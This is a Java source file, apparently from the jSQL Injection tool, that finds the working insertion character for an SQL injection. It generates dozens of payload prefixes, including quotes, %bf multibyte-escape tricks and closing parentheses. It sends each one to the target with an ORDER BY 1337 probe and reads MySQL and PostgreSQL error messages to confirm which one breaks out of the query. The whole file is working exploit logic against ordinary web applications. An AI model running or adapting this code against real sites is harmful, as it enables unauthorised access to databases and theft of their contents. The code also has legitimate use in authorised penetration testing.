package com.jsql.model.suspendable;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.suspendable.callable.CallablePageSource;
import com.jsql.model.suspendable.callable.ThreadFactoryCallable;

/**
 * Runnable class, define insertionCharacter to be used during injection,
 * i.e -1 in "[..].php?id=-1 union select[..]", sometimes it's -1, 0', 0, etc.
 * Find working insertion char when error message occurs in source.
 * Force to 1 if no insertion char works and empty value from user,
 * Force to user's value if no insertion char works,
 * Force to insertion char otherwise.
 */
public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();

    public SuspendableGetCharInsertion(InjectionModel injectionModel) {
        super(injectionModel);
    }

    @Override
    public String run(Object... args) throws JSqlException {
        
        String characterInsertionByUser = (String) args[0];

        // Parallelize the search and let the user stops the process if needed.
        // SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
        // and check if a correct error message is sent back by the server:
        //         Unknown column '1337' in 'order clause'
        // or   supplied argument is not a valid MySQL result resource
        ExecutorService taskExecutor = Executors.newCachedThreadPool(new ThreadFactoryCallable("CallableGetInsertionCharacter"));
        CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        List<String> charactersInsertion = this.initializeCallables(taskCompletionService);

        String characterInsertionDetected = null;
        
        int total = charactersInsertion.size();
        while (0 < total) {

            if (this.isSuspended()) {
                throw new StoppedByUserSlidingException();
            }
            
            try {
                CallablePageSource currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                if (
                    //TODO
                    // the correct character: mysql
                    Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() ||
                    Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches() ||

                    // the correct character: postgresql
                    Pattern.compile(".*ORDER BY position 1337 is not in select list.*", Pattern.DOTALL).matcher(pageSource).matches()
                ) {
                    characterInsertionDetected = currentCallable.getCharacterInsertion();
                    break;
                }
            } catch (InterruptedException | ExecutionException e) {
                
                LOGGER.error("Interruption while defining character injection", e);
                Thread.currentThread().interrupt();
            }
        }
        
        // End the job
        try {
            taskExecutor.shutdown();
            if (!taskExecutor.awaitTermination(15, TimeUnit.SECONDS)) {
                taskExecutor.shutdownNow();
            }
        } catch (InterruptedException e) {
            
            LOGGER.error(e.getMessage(), e);
            Thread.currentThread().interrupt();
        }
        
        characterInsertionDetected = this.initializeCharacterInsertion(characterInsertionByUser, characterInsertionDetected);

        // TODO optional
        return characterInsertionDetected;
    }

    private List<String> initializeCallables(CompletionService<CallablePageSource> taskCompletionService) {
        
        List<String> roots = Arrays.asList("-1", "0", "1", "");
        List<String> prefixes = Arrays.asList(
                "prefix",
                "prefix'", "'prefix'",
                "prefix\"", "\"prefix\"",
                "prefix%bf'", "%bf'prefix%bf'",
                "prefix%bf\"", "%bf\"prefix%bf\""
            );
        List<String> suffixes = Arrays.asList("", ")", "))");
        
        List<String> charactersInsertion = new ArrayList<>();
        
        for (String root: roots) {
            for (String prefix: prefixes) {
                for (String suffix: suffixes) {
                    charactersInsertion.add(prefix.replace("prefix", root) + suffix);
                }
            }
        }
        
        for (String characterInsertion: charactersInsertion) {
            
            taskCompletionService.submit(
                new CallablePageSource(
                    characterInsertion
                    + " "
                    + this.injectionModel.getMediatorVendor().getVendor().instance().sqlOrderBy(),
                    characterInsertion,
                    this.injectionModel
                )
            );
        }
        
        return charactersInsertion;
    }

    private String initializeCharacterInsertion(String characterInsertionByUser, String characterInsertionDetected) {
        
        if (characterInsertionDetected == null) {
            
            if (StringUtils.isEmpty(characterInsertionByUser) || InjectionModel.STAR.equals(characterInsertionByUser)) {
                characterInsertionDetected = "1";
            } else {
                characterInsertionDetected = characterInsertionByUser;
            }
            LOGGER.warn("No character insertion activates ORDER BY error, forcing to ["+ characterInsertionDetected.replace(InjectionModel.STAR, "") +"]");
            
        } else if (!characterInsertionByUser.replace(InjectionModel.STAR, "").equals(characterInsertionDetected)) {
            
            String characterInsertionByUserFormat = characterInsertionByUser.replace(InjectionModel.STAR, "");
            LOGGER.debug("Found character insertion ["+ characterInsertionDetected +"] in place of ["+ characterInsertionByUserFormat +"] to detect error on ORDER BY");
            LOGGER.trace("Add manually the character * like ["+ characterInsertionByUserFormat +"*] to force the value ["+ characterInsertionByUserFormat +"]");
        }
        
        return characterInsertionDetected;
    }
}